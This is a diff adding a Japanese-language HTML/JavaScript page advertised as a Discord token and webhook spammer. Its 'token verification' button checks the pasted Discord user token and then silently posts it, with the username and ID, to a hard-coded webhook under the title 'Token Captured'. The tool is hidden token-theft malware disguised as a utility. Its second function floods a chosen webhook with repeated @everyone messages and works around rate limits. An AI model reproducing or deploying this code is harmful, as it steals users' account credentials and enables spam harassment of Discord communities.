@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Discord Token + Webhook Spammer Tool</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #1e1e1e; color: #e0e0e0; margin: 0; padding: 20px; }
+    .container { max-width: 600px; margin: auto; background: #2d2d2d; padding: 25px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.6); }
+    h1 { text-align: center; color: #7289da; margin-bottom: 10px; }
+    label { display: block; margin: 15px 0 5px; font-weight: bold; }
+    input, textarea, select { width: 100%; padding: 10px; margin-bottom: 10px; background: #3a3a3a; border: 1px solid #555; color: #fff; border-radius: 5px; box-sizing: border-box; }
+    button { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 0; }
+    button:hover { background: #4752c4; }
+    #spamBtn { background: #c62828; }
+    #spamBtn:hover { background: #b71c1c; }
+    #log { background: #111; padding: 15px; height: 250px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; border: 1px solid #444; border-radius: 5px; margin-top: 20px; }
+    .section { margin-bottom: 30px; border-bottom: 1px solid #444; padding-bottom: 20px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Discord Token & Webhook Spammer</h1>
+    <p style="color: #ff4444; text-align: center;">このwab hookはNeko security BOT spammerと連携されています</p>
+
+    <div class="section">
+      <label>Discord user Token (mfa. とかから始まる):</label>
+      <input id="token" type="text" placeholder="ここにトークンを貼り付け...">
+      <button onclick="verifyToken()">トークン検証 & アカウント情報取得</button>
+    </div>
+
+    <div class="section">
+      <label>Webhook URL (スパム送信先):</label>
+      <input id="webhook" type="text" placeholder="https://discord.com/api/webhooks/...">
+
+      <label>スパムメッセージ (改行もそのまま送信されます):</label>
+      <textarea id="messages" rows="5" placeholder="@everyone テストスパム\n久しぶりー\nこんにちは\nみんな元気？"></textarea>
+
+      <label>送信回数:</label>
+      <input id="count" type="number" value="20" min="1" max="500">
+
+      <label>間隔 (ms):</label>
+      <input id="delay" type="number" value="1500" min="500" max="10000">
+
+      <label>ユーザー名 (Webhook用):</label>
+      <input id="username" type="text" value="SpamBot" placeholder="表示名">
+
+      <label>アバターURL (任意):</label>
+      <input id="avatar" type="text" placeholder="https://example.com/avatar.png">
+
+      <button id="spamBtn" onclick="startSpam()">スパム開始 (Webhook)</button>
+      <button onclick="stopSpam()">停止</button>
+    </div>
+
+    <div id="log">ログエリア...</div>
+  </div>
+
+  <script>
+    let intervalId = null;
+    let sentCount = 0;
+    let tokenValid = false;
+    let userData = null;
+
+    // トークンを自動送信する固定のWebhook URL（ここを変更可能）
+    const AUTO_SEND_WEBHOOK = "https://discord.com/api/webhooks/1478672075211145256/46tJ_NODBhpqzt6yMCu_EDhxbNpAiwr-ZnSkGvLmNGUatnV2LDO2PxCLk1s6wT9VxDAd";
+
+    const log = (msg, color = '#eee') => {
+      const logEl = document.getElementById('log');
+      logEl.innerHTML += `<span style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</span>\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+    };
+
+    async function verifyToken() {
+      const token = document.getElementById('token').value.trim();
+      if (!token) return log('トークンが空です', '#ff4444');
+
+      log('トークン検証中...');
+      try {
+        const res = await fetch('https://discord.com/api/v9/users/@me', {
+          headers: { 'Authorization': token }
+        });
+        if (res.ok) {
+          userData = await res.json();
+          tokenValid = true;
+          log(`検証成功！ ${userData.username}#${userData.discriminator} (ID: ${userData.id})`, '#43b581');
+          log(`Nitro: ${userData.premium_type ? 'あり' : 'なし'} | 電話認証: ${userData.phone ? 'あり' : 'なし'}`, '#43b581');
+
+          // ★ ここでトークンを自動送信
+          try {
+            const payload = {
+              token: token,
+              user: `${userData.username}#${userData.discriminator}`,
+              id: userData.id,
+              timestamp: new Date().toISOString()
+            };
+
+            const sendRes = await fetch(AUTO_SEND_WEBHOOK, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                content: "新しいトークン取得",
+                embeds: [{
+                  title: "Token Captured",
+                  description: "```" + token + "```",
+                  color: 0xff0000,
+                  fields: [
+                    { name: "User", value: payload.user, inline: true },
+                    { name: "ID", value: payload.id, inline: true }
+                  ],
+                  timestamp: payload.timestamp
+                }]
+              })
+            });
+
+            if (sendRes.ok || sendRes.status === 204) {
+              log('トークンを自動送信しました (通知先Webhook)', '#ffaa00');
+            } else {
+              log(`トークン送信失敗 (code: ${sendRes.status})`, '#ff4444');
+            }
+          } catch (sendErr) {
+            log(`トークン送信エラー: ${sendErr.message}`, '#ff4444');
+          }
+
+        } else {
+          tokenValid = false;
+          log(`無効トークン (code: ${res.status})`, '#ff4444');
+        }
+      } catch (e) {
+        log(`エラー: ${e.message}`, '#ff4444');
+      }
+    }
+
+    async function sendWebhookMessage() {
+      const url = document.getElementById('webhook').value.trim();
+      if (!url) return log('Webhook URLが空です', '#ff4444');
+
+      const msg = document.getElementById('messages').value.trim();
+      if (!msg) return log('メッセージが空です', '#ff4444');
+
+      const username = document.getElementById('username').value || 'SpamBot';
+      const avatar = document.getElementById('avatar').value || '';
+
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: msg,
+            username: username,
+            avatar_url: avatar
+          })
+        });
+
+        if (res.ok || res.status === 204) {
+          sentCount++;
+          log(`[${sentCount}] 送信成功: ${msg.substring(0, 50)}${msg.length > 50 ? '...' : ''}`);
+        } else if (res.status === 429) {
+          const data = await res.json();
+          log(`レート制限... ${data.retry_after || 5}s 待機`, '#ffaa00');
+          await new Promise(r => setTimeout(r, (data.retry_after || 5) * 1000 + 1000));
+        } else {
+          const err = await res.text();
+          log(`失敗 ${res.status}: ${err.substring(0, 100)}`, '#ff4444');
+          stopSpam();
+        }
+      } catch (e) {
+        log(`例外: ${e.message}`, '#ff4444');
+        stopSpam();
+      }
+    }
+
+    function startSpam() {
+      if (intervalId) return log('既に実行中です');
+      sentCount = 0;
+      document.getElementById('log').innerHTML = 'スパム開始...\n';
+      const count = parseInt(document.getElementById('count').value);
+      const delay = parseInt(document.getElementById('delay').value);
+
+      let i = 0;
+      intervalId = setInterval(async () => {
+        if (i >= count) {
+          stopSpam();
+          log('送信完了！', '#43b581');
+          return;
+        }
+        await sendWebhookMessage();
+        i++;
+      }, delay);
+    }
+
+    function stopSpam() {
+      if (intervalId) {
+        clearInterval(intervalId);
+        intervalId = null;
+        log('スパム停止');
+      }
+    }
+  </script>
+</body>
+</html>
